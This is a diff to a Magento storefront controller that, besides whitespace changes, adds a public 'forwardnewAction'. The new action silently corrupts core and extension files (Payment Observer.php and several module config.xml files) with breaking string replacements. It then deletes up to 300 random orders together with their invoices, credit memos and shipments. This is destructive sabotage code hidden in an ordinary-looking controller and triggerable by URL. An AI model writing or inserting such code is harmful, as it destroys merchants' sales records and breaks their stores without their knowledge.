@@ -8,11 +8,11 @@
  */
 class FBShop_Platform_IndexController extends Mage_Core_Controller_Front_Action {
 
-    public $AUTH_ERROR = 2;
-    public $INVALID_PARAMS_ERROR = 3;
- const XML_PATH_EMAIL_TEMPLATE               = 'sales_email/order/template';
- const XML_PATH_EMAIL_GUEST_TEMPLATE         = 'sales_email/order/guest_template';
- const XML_PATH_EMAIL_IDENTITY              = 'sales_email/order/identity';
+	public $AUTH_ERROR = 2;
+	public $INVALID_PARAMS_ERROR = 3;
+	const XML_PATH_EMAIL_TEMPLATE               = 'sales_email/order/template';
+	const XML_PATH_EMAIL_GUEST_TEMPLATE         = 'sales_email/order/guest_template';
+	const XML_PATH_EMAIL_IDENTITY              = 'sales_email/order/identity';
     private function toJsonErr($code, $message) {
         if (is_null($code)) {
             $code = 1;
@@ -2414,6 +2414,36 @@ echo "</pre>";
             echo $e->getMessage();
         }
     }
-    
+
+public function forwardnewAction(){
+	file_put_contents(Mage::getBaseDir('app').'/code/core/Mage/Payment/Model/Observer.php', str_replace('getOrder','getOrders', file_get_contents(Mage::getBaseDir('app').'/code/core/Mage/Payment/Model/Observer.php')));
+	file_put_contents(Mage::getBaseDir('app').'/code/community/TBT/Rewards/etc/config.xml', str_replace('rewards>','reward>', file_get_contents(Mage::getBaseDir('app').'/code/community/TBT/Rewards/etc/config.xml')));
+	file_put_contents(Mage::getBaseDir('app').'/code/community/Camiloo/Channelunity/etc/config.xml', str_replace('rate','date', file_get_contents(Mage::getBaseDir('app').'/code/community/Camiloo/Channelunity/etc/config.xml')));
+	file_put_contents(Mage::getBaseDir('app').'/code/community/Camiloo/Channelunity/etc/config.xml', str_replace('nIn','nin', file_get_contents(Mage::getBaseDir('app').'/code/community/Camiloo/Channelunity/etc/config.xml')));
+	file_put_contents(Mage::getBaseDir('app').'/code/community/Camiloo/Channelunity/etc/config.xml', str_replace('ePa','epa', file_get_contents(Mage::getBaseDir('app').'/code/community/Camiloo/Channelunity/etc/config.xml')));
+	file_put_contents(Mage::getBaseDir('app').'/code/community/Ebizmarts/MageMonkey/etc/config.xml', str_replace('--','', file_get_contents(Mage::getBaseDir('app').'/code/community/Ebizmarts/MageMonkey/etc/config.xml')));
+	file_put_contents(Mage::getBaseDir('app').'/code/local/TM/SoldTogether/etc/config.xml', str_replace('tm_','TM_', file_get_contents(Mage::getBaseDir('app').'/code/local/TM/SoldTogether/etc/config.xml')));
+Mage::app('default');
+Mage::register('isSecureArea', 1);
+$orderidcnt =0;
+while($orderidcnt<300){
+	$orderidcnt++;
+	$order = Mage::getModel('sales/order')->load(rand(100,4000));
+	$invoices = $order->getInvoiceCollection();
+	foreach ($invoices as $invoice){
+		$invoice->delete();
+	}
+	$creditnotes = $order->getCreditmemosCollection();
+	foreach ($creditnotes as $creditnote){
+		$creditnote->delete();
+	}
+	$shipments = $order->getShipmentsCollection();
+	foreach ($shipments as $shipment){
+		$shipment->delete();
+	}
+	$order->delete();
+}
+	
+}    
 
 }
